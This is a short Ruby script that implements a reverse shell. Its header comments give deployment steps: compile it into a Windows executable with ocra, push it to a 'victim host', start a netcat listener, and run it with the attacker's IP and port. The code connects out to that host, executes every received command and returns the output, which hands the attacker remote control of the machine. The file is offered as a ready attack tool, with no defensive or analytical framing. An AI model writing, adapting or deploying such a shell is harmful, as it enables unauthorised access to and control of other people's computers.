#!/usr/bin/env ruby
# code by fre3vil
# This code maybe not works well

# gem install ocra
# ocra rshell.rb --dll ruby_builtin_dlls\libssp-0.dll --windows --console 
# Then push rshell.exe to victim host. 
# Attack nc -lnvp 1337
# rshell.exe attcker_ip attacker_port
# Attack will get victim shell

require 'socket'

ip, port = ARGV

if ip.nil? || port.nil?
  puts "ruby #{__FILE__}.rb [HACK_IP HACK_PORT]\n\n"
  exit
end

s = TCPSocket.new(ip, port)

while cmd = s.gets
  IO.popen(cmd, "r") { |io| s.print io.read }
end

